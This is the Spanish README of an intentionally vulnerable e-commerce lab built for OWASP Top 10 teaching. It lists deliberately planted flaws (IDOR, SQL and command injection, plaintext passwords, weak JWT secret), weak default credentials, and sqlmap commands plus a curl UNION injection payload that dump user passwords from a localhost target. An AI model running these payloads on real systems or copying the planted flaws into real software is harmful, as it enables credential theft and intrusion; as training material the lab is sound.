# Tienda Insegura v1 — Laboratorio OWASP

> **Estado:** Versión 1 completada y preparada para laboratorio local.  
> **Uso exclusivo:** académico, autorizado y aislado.  
> **No exponer a Internet ni a una red de producción.**

Aplicación de comercio electrónico **intencionalmente vulnerable** para practicar identificación, explotación controlada y documentación de fallas asociadas al OWASP Top 10. Incluye frontend, API REST, base de datos, Docker Compose, scripts SQL, guía de despliegue y guía de pruebas.

## 1. Arquitectura

```text
Navegador del laboratorio
        |
        | http://127.0.0.1:3000
        v
+-----------------------+
| Nginx / Frontend      |
| HTML + CSS + JS       |
| puerto interno 80     |
+-----------+-----------+
            | /api y /actuator
            v
+-----------------------+
| Spring Boot 3.2.5     |
| Java 17 / REST / JWT  |
| puerto interno 8080   |
+-----------+-----------+
            | JDBC
            v
+-----------------------+
| PostgreSQL 16         |
| puerto interno 5432   |
+-----------------------+
```

Los tres servicios se conectan por la red Docker `tienda_insegura_v1_lab`. Los puertos publicados se enlazan por defecto a `127.0.0.1`, evitando que el laboratorio quede accesible desde otros equipos.

Documentación ampliada:

- [Arquitectura](docs/arquitectura.md)
- [Guía de despliegue](docs/guia-despliegue.md)
- [Mapeo de vulnerabilidades](docs/mapeo-vulnerabilidades.md)
- [Catálogo de endpoints](docs/endpoints.md)
- [Guía de pentesting](docs/pruebas-pentesting.md)
- [Comandos PowerShell](docs/comandos-powershell.md)
- [Checklist de entrega](docs/checklist-entrega-v1.md)
- [Validación estática del paquete](docs/validacion-estatica.md)
- Resultado resumido: `VALIDACION_RESULTADOS.txt`
- Colección Postman: `pentesting/Tienda-Insegura-v1.postman_collection.json`

## 2. Tecnologías

| Capa | Tecnología |
|---|---|
| Frontend | HTML5, CSS3, JavaScript vanilla |
| Proxy web | Nginx 1.27 Alpine |
| Backend | Java 17, Spring Boot 3.2.5 |
| Persistencia | Spring Data JPA y JdbcTemplate |
| Base de datos | PostgreSQL 16 Alpine |
| Autenticación vulnerable | JWT con `jjwt` |
| Contenedores | Docker y Docker Compose |
| Pentesting | sqlmap, curl/PowerShell, OWASP Dependency-Check |

## 3. Vulnerabilidades incluidas

| Categoría | Ejemplo implementado |
|---|---|
| Broken Access Control | IDOR en pedidos; rol manipulable; panel admin sin validación de rol |
| Security Misconfiguration | Actuator expuesto; CORS abierto; debug y stacktraces |
| Software Supply Chain Failures | `log4j-core` 2.14.1 incluido para análisis con Dependency-Check |
| Cryptographic Failures | contraseñas en texto plano; secreto JWT débil |
| Injection | SQLi en búsqueda/producto; command injection en diagnóstico |
| Insecure Design | carrito sin validar stock o cantidades |
| Authentication Failures | sin rate limit ni bloqueo; token de larga duración |
| Integrity Failures | upload sin validación de extensión, MIME ni nombre |
| Logging Failures | credenciales registradas en logs |
| Exceptional Conditions | mensajes internos y stacktraces devueltos al cliente |

> La dependencia Log4j vulnerable se incluye para **detección de cadena de suministro**. El proyecto usa Logback como logger principal y no afirma un vector Log4Shell funcional dentro de la aplicación.

## 4. Inicio rápido con Docker

### Requisitos

- Docker Desktop o Docker Engine con Compose v2.
- 2 GB de memoria libre.
- Puertos locales 3000, 8080 y 5432 disponibles.

### Levantar el stack completo

Desde la raíz:

```bash
docker compose --profile full up -d --build
```

Comprobar:

```bash
docker compose ps
docker compose logs -f backend
```

Abrir:

- Tienda: `http://127.0.0.1:3000`
- API: `http://127.0.0.1:8080/api/productos`
- Actuator: `http://127.0.0.1:8080/actuator`

Detener:

```bash
docker compose --profile full down
```

Restablecer toda la base de datos:

```bash
docker compose --profile full down -v
docker compose --profile full up -d --build
```

## 5. Ejecución para desarrollo

### PostgreSQL en Docker

```bash
docker compose up -d postgres
```

### Backend con Maven instalado

```bash
cd backend
mvn spring-boot:run
```

> El paquete no incluye un Maven Wrapper incompleto. Se requiere Maven 3.8+ instalado en el sistema para esta modalidad.

### Frontend con Live Server

Abrir `frontend/index.html` con Live Server, normalmente en:

```text
http://127.0.0.1:5500
```

`frontend/js/config.js` detecta el modo de ejecución:

- puerto 3000 o HTTPS: usa `/api` mediante Nginx;
- otros puertos: usa `http://127.0.0.1:8080/api`.

## 6. Credenciales de laboratorio

| Usuario | Contraseña | Rol |
|---|---|---|
| `admin` | `admin123` | ADMIN |
| `jperez` | `password1` | USER |
| `mgarcia` | `qwerty123` | USER |

Son deliberadamente débiles y se almacenan en texto plano para la práctica.

## 7. Base de datos incluida

- `backend/src/main/resources/db/schema.sql`: estructura.
- `backend/src/main/resources/db/data.sql`: datos semilla idempotentes.
- `database/init.sql`: inicialización completa.
- `database/backup-v1.sql`: respaldo lógico reproducible que elimina y recrea las tablas.

El seed incluye dos pedidos de usuarios distintos para demostrar IDOR sin crear compras previamente.

Restauración manual:

```bash
psql -h 127.0.0.1 -p 5432 -U tienda_user \
  -d tienda_insegura -f database/backup-v1.sql
```

## 8. SQL Injection automatizado con sqlmap

Objetivo local:

```text
GET http://127.0.0.1:8080/api/productos/buscar?q=test
```

Linux/macOS/WSL:

```bash
bash pentesting/sqlmap/run-sqlmap.sh
```

PowerShell:

```powershell
.\pentesting\sqlmap\run-sqlmap.ps1
```

Los scripts rechazan destinos que no sean `localhost` o `127.0.0.1`.

Ejecución manual:

```bash
sqlmap -u "http://127.0.0.1:8080/api/productos/buscar?q=test" \
  -p q --batch --dbs

sqlmap -u "http://127.0.0.1:8080/api/productos/buscar?q=test" \
  -p q --batch -D tienda_insegura -T usuarios \
  -C username,password,role --dump
```

Prueba manual compatible con las seis columnas de la consulta:

```bash
curl -G "http://127.0.0.1:8080/api/productos/buscar" \
  --data-urlencode "q=x%') UNION SELECT id,username,password,0::numeric,0,NULL FROM usuarios -- "
```

Consulta la guía detallada en [pentesting/sqlmap/GUIA.md](pentesting/sqlmap/GUIA.md).

## 9. Estructura

```text
tienda-insegura/
├── backend/
│   ├── Dockerfile
│   ├── pom.xml
│   └── src/
├── database/
│   ├── init.sql
│   └── backup-v1.sql
├── docker/
│   └── nginx.conf
├── docs/
├── evidencias/
├── frontend/
├── pentesting/
│   └── sqlmap/
├── scripts/
├── .env.example
├── docker-compose.yml
├── Informe_Tecnico_Tienda_Insegura_v1.docx
└── README.md
```

## 10. Evidencias recomendadas

Guardar capturas y salidas en `evidencias/`:

1. contenedores saludables;
2. catálogo cargado;
3. sqlmap detectando PostgreSQL;
4. dump de `usuarios`;
5. IDOR entre `jperez` y `mgarcia`;
6. command injection con `whoami` o `id`;
7. Actuator expuesto;
8. reporte de Dependency-Check;
9. upload inseguro con archivo inocuo;
10. stacktrace expuesto.

## 11. Nota para la Versión 2

La V2 deberá conservar las mismas funcionalidades, pero corregir cada hallazgo con:

- Spring Security y autorización por rol/propietario;
- BCrypt;
- JWT robusto y de corta duración;
- consultas parametrizadas;
- validación de entrada;
- upload seguro;
- CORS restringido;
- Actuator limitado;
- manejo seguro de errores y logs;
- HTTPS/TLS con certificado.

## 12. Licencia y alcance

Proyecto académico. Todo el contenido debe utilizarse exclusivamente en entornos propios o expresamente autorizados.
